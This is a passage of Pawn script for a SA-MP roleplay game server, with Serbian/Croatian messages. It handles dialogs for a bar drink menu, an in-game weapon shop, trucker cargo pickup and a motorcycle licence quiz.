				if( PlayerInfo[ playerid ][ xNovac ] < 200) return SendErrorMessage( playerid, "Nemate dovoljno novca 200$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ] , 170 );
				DajIgracuNovac( playerid, -200 );
				if( uFirmi[ playerid ] != -1 ) BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				SetPlayerDrunkLevel( playerid, drunklevel + 1000);
				if( drunklevel > 2000 ) {
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}
				format( globalstring, sizeof( globalstring ), "* %s pije viski.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_BEER);
			}
			case 1: {
				if( PlayerInfo[ playerid ][ xNovac ] < 170) return SendErrorMessage( playerid, "Nemate dovoljno novca 170$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 170 );
				DajIgracuNovac( playerid, -170 );
				if( uFirmi[ playerid ] != -1 ) BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				SetPlayerDrunkLevel( playerid, drunklevel + 500);
				if( drunklevel > 2000 ) {
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}
				format( globalstring, sizeof( globalstring ), "* %s pije vodku.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 2: {
				if( PlayerInfo[ playerid ][ xNovac ] < 85) return SendErrorMessage( playerid, "Nemate dovoljno novca 85$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 85 );
				DajIgracuNovac( playerid, -85 );
				if( uFirmi[ playerid ] != -1 ) BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				SetPlayerDrunkLevel( playerid, drunklevel + 200);
				if( drunklevel > 2000 ) {
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}
				format( globalstring, sizeof( globalstring ), "* %s pije Heineken pivo.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 3: {
				if( PlayerInfo[ playerid ][ xNovac ] < 120) return SendErrorMessage( playerid, "Nemate dovoljno novca 120$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 120 );
				DajIgracuNovac( playerid, -120 );
				if( uFirmi[ playerid ] != -1 ) BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				SetPlayerDrunkLevel( playerid, drunklevel + 800);
				if( drunklevel > 2000 ) {
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}
				format( globalstring, sizeof( globalstring ), "* %s pije Konjak.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 4: {
				if( PlayerInfo[ playerid ][ xNovac ] < 150) return SendErrorMessage( playerid, "Nemate dovoljno novca 150$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 150 );
				DajIgracuNovac( playerid, -150 );
				if( uFirmi[ playerid ] != -1 ) BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				SetPlayerDrunkLevel( playerid, drunklevel + 500);
				if( drunklevel > 2000 ) {
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}
				format( globalstring, sizeof( globalstring ), "* %s pije tekilu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 5: {
				if( PlayerInfo[ playerid ][ xNovac ] < 290) return SendErrorMessage( playerid, "Nemate dovoljno novca 290$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 190 );
				DajIgracuNovac( playerid, -290 );
				if( uFirmi[ playerid ] != -1 ) BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				SetPlayerDrunkLevel( playerid, drunklevel + 700);
				if( drunklevel > 2000 ) {
					GameTextForPlayer( playerid, "~p~Pijani ste", 3500, 1);
				}
				format( globalstring, sizeof( globalstring ), "* %s pije Jack Daniels.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 6: {
				if( PlayerInfo[ playerid ][ xNovac ] < 60 )  return SendErrorMessage( playerid, "Nemate dovoljno novca 60$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 60 );
				DajIgracuNovac( playerid, -60 );
                if( uFirmi[ playerid ] != -1 ) BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format( globalstring, sizeof( globalstring ), "* %s pije mineralnu vodu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 7: {
				if( PlayerInfo[ playerid ][ xNovac ] < 80 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 80$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 80 );
				DajIgracuNovac( playerid, -80 );
                if( uFirmi[ playerid ] != -1 ) BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format( globalstring, sizeof( globalstring ), "* %s pije Cedevitu od Narandze.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
			case 8: {
				if( PlayerInfo[ playerid ][ xNovac ] < 50 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 50$!");
				if( uFirmi[ playerid ] != -1 ) BussinesMoney( uFirmi[ playerid ], 50 );
				DajIgracuNovac( playerid, -50 );
				if( uFirmi[ playerid ] != -1 ) BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
				format( globalstring, sizeof( globalstring ), "* %s pije coca colu.", ImeIgraca( playerid ) );
			    PorukaRadius(15.0, playerid, globalstring, LJUBICASTA );
			    SetPlayerSpecialAction( playerid, SPECIAL_ACTION_DRINK_WINE);
			}
		}
	}
	else if( dialogid == dialog_GUNSHOP ) {
        if( response ) {
            switch( listitem ) {
				case 0: //noz
				{
				
					if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca 500$!");
					DajIgracuNovac( playerid, -500 );
					GiveWeaponToPlayer( playerid, 4, 1);
					format( globalstring, sizeof( globalstring ), "* %s je kupio noz.", ImeIgraca( playerid ) );
					PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
					BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
					BussinesMoney( uFirmi[ playerid ], 440);
        		}
        		case 1: //bassebal bat
				{
					if( PlayerInfo[ playerid ][ xNovac ] < 500) return SendErrorMessage( playerid, "Nemate dovoljno novca 500$!");
					DajIgracuNovac( playerid, -500 );
					GiveWeaponToPlayer( playerid, 5, 1 );
					format( globalstring, sizeof( globalstring ), "* %s je kupio bassebal bat.", ImeIgraca( playerid ));
					PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
					BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
					BussinesMoney( uFirmi[ playerid ], 480);
        		}
                case 2: // 9mm
                {
					if( PlayerInfo[ playerid ][ xNovac ] < 1000) return SendErrorMessage( playerid, "Nemate dovoljno novca 1.000$!");
					DajIgracuNovac( playerid, -1000 );
					GiveWeaponToPlayer( playerid, 22, 50 );
					format( globalstring, sizeof( globalstring ), "* %s je kupio Pistol 9mm.", ImeIgraca( playerid ));
					PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
					BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
					BussinesMoney( uFirmi[ playerid ], 540);
        		}
        		case 3: // eagle
                {
					if( PlayerInfo[ playerid ][ xNovac ] < 3000) return SendErrorMessage( playerid, "Nemate dovoljno novca 3.000$!");
					DajIgracuNovac( playerid, -3000 );
					GiveWeaponToPlayer( playerid, 24, 50 );
					format( globalstring, sizeof( globalstring ), "* %s je kupio Desert Eagle.", ImeIgraca( playerid ) );
					PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
					BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
					BussinesMoney( uFirmi[ playerid ], 560);
        		}
        		case 4: // Shotgun
                {
					if( PlayerInfo[ playerid ][ xNovac ] < 8000) return SendErrorMessage( playerid, "Nemate dovoljno novca 8.000$!");
					DajIgracuNovac( playerid, -8000 );
					GiveWeaponToPlayer( playerid, 25, 30 );
					format( globalstring, sizeof( globalstring ), "* %s je kupio Shotgun.", ImeIgraca( playerid ));
					PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
					BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
					BussinesMoney( uFirmi[ playerid ], 580);
        		}
        		case 5: // Country Rifle
                {
					if( PlayerInfo[ playerid ][ xNovac ] < 15000) return SendErrorMessage( playerid, "Nemate dovoljno novca 15.000$!");
					DajIgracuNovac( playerid, -15000 );
					GiveWeaponToPlayer( playerid, 33, 20 );
					format( globalstring, sizeof( globalstring ), "* %s je kupio Country Rifle.", ImeIgraca( playerid ));
					PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
					BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
					BussinesMoney( uFirmi[ playerid ], 600);
        		}
        		case 6: // Pancirka
                {
					if( PlayerInfo[ playerid ][ xNovac ] < 5000) return SendErrorMessage( playerid, "Nemate dovoljno novca 5.000$!");
					DajIgracuNovac( playerid, -5000 );
					Novi_SetPlayerArmour( playerid, 100 );
					format( globalstring, sizeof( globalstring ), "* %s je kupio pancir.", ImeIgraca( playerid ));
					PorukaRadius( 8.0, playerid, globalstring, LJUBICASTA );
					BussinesInfo[ uFirmi[ playerid ] ][ bProducts ]--;
					BussinesMoney( uFirmi[ playerid ], 620);
        		}
			}
		}
	}
	else if( dialogid == dialog_CARGOS)
    {
        if( response )
        {
            if( Trucker[ playerid ][ tHasCargo ] == true ) return SendErrorMessage( playerid, "Vec imas kutiju u ruci." );
	        new vehicleid = getPlayerNearestVehicle( playerid );
			if( !isATrucker( vehicleid ) ) return SendErrorMessage( playerid, "Nisi do vozila koje moze da nosi kutije." );
            switch( listitem )
            {
				case 0:
				{
				    if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 0 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 1 u vozilu." );
                    new f = truckerVehicle[ vehicleid ][ tID ][ 0 ];
					if( GetVehicleModel( vehicleid ) == 413 || GetVehicleModel( vehicleid ) == 440 || GetVehicleModel( vehicleid ) == 459 || GetVehicleModel( vehicleid ) == 482 )
					{
					    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 0 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 0 ] = 0;
					}
					else {
					    DestroyDynamicObject( Cargo[ f ][ cObjID ] );
					    Cargo[ f ][ cPlaced ] = 0;
						Cargo[ f ][ cObjPos ][ 0 ] = 0;
						Cargo[ f ][ cObjPos ][ 1 ] = 0;
						Cargo[ f ][ cObjPos ][ 2 ] = 0;
						Cargo[ f ][ cVehID  ] = -1;
						SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 0 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 0 ] = 0;
					}
				}
				case 1:
				{
				    if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 1 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 2 u vozilu." );
				    new f = truckerVehicle[ vehicleid ][ tID ][ 1 ];
					if( GetVehicleModel( vehicleid ) == 413 || GetVehicleModel( vehicleid ) == 440 || GetVehicleModel( vehicleid ) == 459 || GetVehicleModel( vehicleid ) == 482 )
					{
					    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 1 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 1 ] = 0;
					}
					else {
					    DestroyDynamicObject( Cargo[ f ][ cObjID ] );
					    Cargo[ f ][ cPlaced ] = 0;
						Cargo[ f ][ cObjPos ][ 0 ] = 0;
						Cargo[ f ][ cObjPos ][ 1 ] = 0;
						Cargo[ f ][ cObjPos ][ 2 ] = 0;
						Cargo[ f ][ cVehID  ] = -1;
						SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 1 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 1 ] = 0;
					}
				}
				case 2:
				{
				    if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 2 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 3 u vozilu." );
				    new f = truckerVehicle[ vehicleid ][ tID ][ 2 ];
				    if( GetVehicleModel( vehicleid ) == 413 || GetVehicleModel( vehicleid ) == 440 || GetVehicleModel( vehicleid ) == 459 || GetVehicleModel( vehicleid ) == 482 )
					{
					    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 2 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 2 ] = 0;
					}
					else {
					    DestroyDynamicObject( Cargo[ f ][ cObjID ] );
					    Cargo[ f ][ cPlaced ] = 0;
						Cargo[ f ][ cObjPos ][ 0 ] = 0;
						Cargo[ f ][ cObjPos ][ 1 ] = 0;
						Cargo[ f ][ cObjPos ][ 2 ] = 0;
						Cargo[ f ][ cVehID  ] = -1;
						SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 2 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 2 ] = 0;
					}
				}
				case 3:
				{
				    if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 3 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 4 u vozilu." );
				    new f = truckerVehicle[ vehicleid ][ tID ][ 3 ];
				    if( GetVehicleModel( vehicleid ) == 413 || GetVehicleModel( vehicleid ) == 440 || GetVehicleModel( vehicleid ) == 459 || GetVehicleModel( vehicleid ) == 482 )
					{
					    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 3 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 3 ] = 0;
					}
					else {
					    DestroyDynamicObject( Cargo[ f ][ cObjID ] );
					    Cargo[ f ][ cPlaced ] = 0;
						Cargo[ f ][ cObjPos ][ 0 ] = 0;
						Cargo[ f ][ cObjPos ][ 1 ] = 0;
						Cargo[ f ][ cObjPos ][ 2 ] = 0;
						Cargo[ f ][ cVehID  ] = -1;
						SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 3 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 3 ] = 0;
					}
				}
				case 4:
				{
				    if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 4 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 5 u vozilu." );
				    new f = truckerVehicle[ vehicleid ][ tID ][ 4 ];
				    if( GetVehicleModel( vehicleid ) == 413 || GetVehicleModel( vehicleid ) == 440 || GetVehicleModel( vehicleid ) == 459 || GetVehicleModel( vehicleid ) == 482 )
					{
					    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 4 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 4 ] = 0;
					}
					else {
					    DestroyDynamicObject( Cargo[ f ][ cObjID ] );
					    Cargo[ f ][ cPlaced ] = 0;
						Cargo[ f ][ cObjPos ][ 0 ] = 0;
						Cargo[ f ][ cObjPos ][ 1 ] = 0;
						Cargo[ f ][ cObjPos ][ 2 ] = 0;
						Cargo[ f ][ cVehID  ] = -1;
						SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 4 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 4 ] = 0;
					}
				}
				case 5:
				{
					if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 5 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 6 u vozilu." );
				    new f = truckerVehicle[ vehicleid ][ tID ][ 5 ];
				    if( GetVehicleModel( vehicleid ) == 413 || GetVehicleModel( vehicleid ) == 440 || GetVehicleModel( vehicleid ) == 459 || GetVehicleModel( vehicleid ) == 482 )
					{
					    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 5 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 5 ] = 0;
					}
					else {
					    DestroyDynamicObject( Cargo[ f ][ cObjID ] );
					    Cargo[ f ][ cPlaced ] = 0;
						Cargo[ f ][ cObjPos ][ 0 ] = 0;
						Cargo[ f ][ cObjPos ][ 1 ] = 0;
						Cargo[ f ][ cObjPos ][ 2 ] = 0;
						Cargo[ f ][ cVehID  ] = -1;
						SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				        Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 5 ] = 0;
		                ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 5 ] = 0;
					}
				}
				case 6:
				{
					if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 6 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 7 u vozilu." );
				    new f = truckerVehicle[ vehicleid ][ tID ][ 6 ];
                    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				    Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 6 ] = 0;
		            ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 6 ] = 0;
				}
				case 7:
				{
					if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 7 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 8 u vozilu." );
				    new f = truckerVehicle[ vehicleid ][ tID ][ 7 ];
                    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				    Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 7 ] = 0;
		            ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 7 ] = 0;
				}
				case 8:
				{
					if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 8 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 9 u vozilu." );
				    new f = truckerVehicle[ vehicleid ][ tID ][ 8 ];
                    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				    Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 8 ] = 0;
		            ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 8 ] = 0;
				}
				case 9:
				{
					if( truckerVehicle[ vehicleid ][ tCargoPlaced ][ 9 ] == 0 ) return SendErrorMessage( playerid, "Nema kutije 10 u vozilu." );
				    new f = truckerVehicle[ vehicleid ][ tID ][ 9 ];
                    SetPlayerAttachedObject( playerid, OBJECT_NOSI, 1271, 1, 0.351057, 0.559609, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 );
				    Trucker[ playerid ][ tHasCargo ] = true; Trucker[ playerid ][ tID ] = f; truckerVehicle[ vehicleid ][ tCargoPlaced ][ 9 ] = 0;
		            ApplyAnimation( playerid, "CARRY", "crry_prtial", 4.1, 0, 1, 1, 1, 1, 1); truckerVehicle[ vehicleid ][ tID ][ 9 ] = 0;
				}
			}
		}
	}
	else if( dialogid == dialog_M_ISPIT)
	{
	    if(GetPVarInt( playerid, "dialog_M_POLAGANJE") == 1)
	    {
		    if( response )
		    {
		        SetPVarInt( playerid, "dialog_M_POLAGANJE", 2);
				SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_M_POLAGANJE", 2);
				SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Pitanje br. 2", ""col_white"Kolika je dozvoljena brzina u naseljenim mjestima?", "120km/h", "70km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_M_POLAGANJE") == 2)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_M_POLAGANJE", 3);
				SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_M_POLAGANJE", 3);
				SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Pitanje br. 3", ""col_white"Kolika je dozvoljena brzina u ne naseljenim mjestima?", "130km/h", "50km/h");
		    }
	    }
	    else if(GetPVarInt( playerid, "dialog_M_POLAGANJE") == 3)
	    {
		    if( response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				SetPVarInt( playerid, "dialog_M_POLAGANJE", 4);
				SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		    else if( !response )
		    {
		        SetPVarInt( playerid, "dialog_M_POLAGANJE", 4);
				SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Pitanje br. 4", ""col_crvena"Na raskrizju bez semafora prednost ima?\n\n"col_crvena"A) "col_white"Onaj koji mi je sa desne strane\n"col_crvena"B) "col_white"Onaj koji mi je sa lijeve strane", "A", "B");
		    }
		}
	    else if(GetPVarInt( playerid, "dialog_M_POLAGANJE") == 4)
	    {
		    if( response )
		    {
				SetPVarInt( playerid, "dialog_M_POLAGANJE", 5);
				SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
		        SetPVarInt( playerid, "dialog_M_POLAGANJE", 5);
				SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Pitanje br. 5", ""col_crvena"Ukoliko skrivite nesrecu vi cete\n\n"col_crvena"A) "col_white"Pozvati policiju i otici\n"col_crvena"B) "col_white"Pozvati policiju i pomoci ozlijedjenom", "A", "B");
		    }
		}
	    else if(GetPVarInt( playerid, "dialog_M_POLAGANJE") == 5)
	    {
		    if( response )
		    {
				if(PolaganjeBodovi[ playerid ]  >= 4)
				{
					DeletePVar( playerid, "dialog_M_POLAGANJE");
			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste dozvolu za motor.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					PlayerInfo[ playerid ][ xMotorska ] = 1;
					SavePlayer( playerid );
				}
				else if(PolaganjeBodovi[ playerid ]  < 4)
				{
					SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_M_POLAGANJE");
				}
		    }
		    else if( !response )
		    {
				PolaganjeBodovi[ playerid ] ++;
				if(PolaganjeBodovi[ playerid ]  >= 4)
				{
					DeletePVar( playerid, "dialog_M_POLAGANJE");
			        format( globalstring, sizeof( globalstring ), ""col_white"Uspesno ste polozili testove sa "col_crvena"%d "col_white"bodova.\nDobili ste dozvolu za motor.", PolaganjeBodovi[ playerid ] );
					SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Cestitamo !", globalstring, "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					PlayerInfo[ playerid ][ xMotorska ] = 1;
					SavePlayer( playerid );
				}
				else if(PolaganjeBodovi[ playerid ]  < 4)
				{
					SPD( playerid, dialog_M_ISPIT , DSMSG, ""col_white"Zao nam je", "Nemate dovoljno za prolazak testova.", "Uredu", "");
					PolaganjeBodovi[ playerid ]  = 0;
					DeletePVar( playerid, "dialog_M_POLAGANJE");
				}
		    }
		}
	}
	else if( dialogid == dialog_A_ISPIT)
	{
	    if(GetPVarInt( playerid, "dialog_POLAGANJE") == 1)
	    {
